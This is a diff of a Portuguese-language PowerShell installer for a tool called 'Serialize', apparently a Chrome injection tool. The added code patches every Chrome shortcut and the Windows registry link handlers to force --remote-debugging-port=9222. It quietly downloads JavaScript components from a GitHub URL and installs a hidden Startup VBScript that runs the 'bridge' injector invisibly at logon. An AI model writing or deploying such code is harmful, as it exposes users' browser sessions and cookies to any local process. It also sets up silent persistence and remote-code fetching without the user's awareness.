@@ -1,49 +1,58 @@
-# Serialize Installer - Version 0.3
+# Serialize Installer - Version 0.4
 $installPath = "$env:APPDATA\Serialize"
 if (!(Test-Path $installPath)) { New-Item -Path $installPath -ItemType Directory }
 
-Write-Host "--- Iniciando Instalação do Serialize ---" -ForegroundColor Cyan
+Write-Host "--- Iniciando Instalação do Serialize v0.4 (Onipresente) ---" -ForegroundColor Cyan
 
-# 0. Garante que o Chrome está fechado (Necessário para a Flag ativar)
-Write-Host "Certifique-se de fechar o Chrome para que as alterações surtam efeito." -ForegroundColor Yellow
+# 1. Função para injetar flag em TODOS os atalhos possíveis (Desktop, Barra de Tarefas, Menu Iniciar)
+function Patch-All-Shortcuts {
+    $shell = New-Object -ComObject WScript.Shell
+    $paths = @(
+        [System.Environment]::GetFolderPath('Desktop'),
+        "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar",
+        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
+        "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs"
+    )
 
-# 1. Função para injetar flag em atalhos (.lnk)
-function Inject-Serialize-Flag {
-    param([string]$folderPath)
-    if (Test-Path $folderPath) {
-        $shell = New-Object -ComObject WScript.Shell
-        $shortcuts = Get-ChildItem -Path $folderPath -Filter "*Chrome*.lnk"
-        
-        foreach ($lnk in $shortcuts) {
-            $shortcut = $shell.CreateShortcut($lnk.FullName)
-            if ($shortcut.TargetPath -like "*chrome.exe*") {
-                $shortcut.Arguments = "--remote-debugging-port=9222"
-                $shortcut.Save()
-                Write-Host "Flag injetada em: $($lnk.Name)" -ForegroundColor Green
+    foreach ($path in $paths) {
+        if (Test-Path $path) {
+            Get-ChildItem -Path $path -Filter "*Chrome*.lnk" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                try {
+                    $shortcut = $shell.CreateShortcut($_.FullName)
+                    if ($shortcut.TargetPath -like "*chrome.exe*") {
+                        $shortcut.Arguments = "--remote-debugging-port=9222"
+                        $shortcut.Save()
+                        Write-Host "Flag injetada em: $($_.Name)" -ForegroundColor Green
+                    }
+                } catch { }
             }
         }
     }
 }
 
-# 2. Varre Desktop e Barra de Tarefas
-$desktop = [System.Environment]::GetFolderPath('Desktop')
-$taskbar = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
+# 2. Patch de Registro: Força a flag mesmo abrindo por links externos
+Write-Host "Aplicando patch no Registro do Windows..." -ForegroundColor Yellow
+$chromeRegCommand = "`"C:\Program Files\Google\Chrome\Application\chrome.exe`" --remote-debugging-port=9222 -- `"%1`""
+$regPaths = @(
+    "HKCU:\Software\Classes\chromeHTML\shell\open\command",
+    "HKCU:\Software\Classes\ChromeSSHTM\shell\open\command"
+)
 
-Inject-Serialize-Flag $desktop
-Inject-Serialize-Flag $taskbar
+foreach ($reg in $regPaths) {
+    if (!(Test-Path $reg)) { New-Item -Path $reg -Force | Out-Null }
+    Set-ItemProperty -Path $reg -Name "(Default)" -Value $chromeRegCommand
+}
 
-# 3. Baixa os componentes do repositório
+# 3. Executa a varredura de atalhos
+Patch-All-Shortcuts
+
+# 4. Baixa os componentes do repositório
 Write-Host "Baixando componentes do Serialize..." -ForegroundColor Yellow
 $baseUrl = "https://raw.githubusercontent.com/denishark333/serialize1.0/main"
+Invoke-WebRequest -Uri "$baseUrl/core.js" -OutFile "$installPath\core.js" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "$baseUrl/bridge.js" -OutFile "$installPath\bridge.js" -ErrorAction SilentlyContinue
 
-# Download do Core (CSS/JS do YouTube)
-Invoke-WebRequest -Uri "$baseUrl/core.js" -OutFile "$installPath\core.js"
-
-# Download do Bridge (O Injetor/Monitor)
-Invoke-WebRequest -Uri "$baseUrl/bridge.js" -OutFile "$installPath\bridge.js"
-
-# 4. Criar o VBScript para rodar o Bridge de forma invisível
-Write-Host "Configurando inicialização silenciosa..." -ForegroundColor Yellow
+# 5. Criar o VBScript para rodar o Bridge de forma invisível
 $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SerializeBridge.vbs"
 $vbsContent = @"
 Set WinScriptHost = CreateObject("WScript.Shell")
@@ -52,6 +61,5 @@ Set WinScriptHost = Nothing
 "@
 $vbsContent | Out-File $vbsPath -Encoding ASCII
 
-Write-Host "--- Serialize instalado com sucesso! ---" -ForegroundColor Cyan
-Write-Host "1. Reinicie o Chrome pelos atalhos modificados."
-Write-Host "2. O motor de injeção iniciará automaticamente com o Windows."
+Write-Host "--- Serialize v0.4 instalado com sucesso! ---" -ForegroundColor Cyan
+Write-Host "Agora o Bridge encontrará o Chrome por qualquer atalho."
